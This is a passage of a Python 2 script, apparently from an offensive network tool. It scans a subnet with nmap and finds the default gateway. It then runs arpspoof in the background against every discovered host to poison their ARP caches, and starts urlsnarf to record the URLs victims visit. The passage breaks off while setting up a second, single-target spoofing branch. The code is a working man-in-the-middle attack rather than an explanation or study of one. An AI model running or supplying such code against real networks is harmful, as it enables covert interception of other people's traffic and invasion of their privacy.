if not(results.mitmall=="none"): #Most efficent way to arpspoof subnet
        ipnet=results.mitmall
        iplist=os.popen("nmap -sP "+ipnet+" | grep 'Nmap scan' | awk '{ print $5; }'").read()
        iplist=iplist.split()
        dgip=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
        dgip=dgip.split()[0]
        print "Spoofing "+dgip+"\n\n"
        print "Targets: \n"
        for ip in iplist:
                print ip
                os.popen("nohup "+timeout+"arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")
        os.popen("nohup "+timeout+"urlsnarf  >> visitedsites >/dev/null 2>&1 &")
        EnaLogging() # Enable iptables-logging

if not(results.mitm=="none"):
        print "im in"
        target=results.mitm
        if(results.dg=="none"): #Searches for gateway
                dg=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
                dg=dg.split()[0]